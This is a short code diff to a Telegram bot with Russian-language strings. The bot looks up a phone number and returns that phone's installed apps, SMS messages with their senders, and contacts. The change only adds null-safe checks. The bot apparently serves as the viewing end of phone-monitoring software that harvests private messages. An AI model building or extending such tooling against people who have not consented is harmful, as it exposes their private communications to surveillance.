@@ -56,7 +56,7 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                         });
                         databtns.push({ text: "Контакты", callback_data: "Sendcontacts" })
                     }
-                    if (userdataByPhone.data.userApps[0].apps) {
+                    if (userdataByPhone.data?.userApps[0].apps) {
                         appMessages = userdataByPhone.data.userApps[0].apps.map(element => {
                             const label = `Название: ${element.label}`;
                             const packageName = `Название пакета: ${element.packageName}`;
@@ -64,7 +64,7 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                         });
                         databtns.push({ text: "Приложения", callback_data: "Sendapps" })
                     }
-                    if (userdataByPhone.data.userMessages[0].messages) {
+                    if (userdataByPhone.data?.userMessages[0].messages) {
                        messageMessages = userdataByPhone.data.userMessages[0].messages.map(element => {
                             const body = `Сообщение: ${element.body}`;
                             const originatingAddress = `Отправитель: ${element.originatingAddress}`;
